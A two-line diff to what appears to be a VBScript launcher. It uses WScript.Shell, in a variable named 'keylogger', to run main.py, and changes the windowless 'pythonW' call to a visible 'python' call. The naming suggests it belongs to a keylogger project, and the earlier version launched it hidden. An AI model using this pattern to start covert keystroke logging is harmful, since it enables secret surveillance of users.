@@ -1,2 +1,2 @@
 Set keylogger = CreateObject("WScript.shell")
-keylogger.Run "pythonW main.py", 1, False
+keylogger.Run "python main.py", 1, False
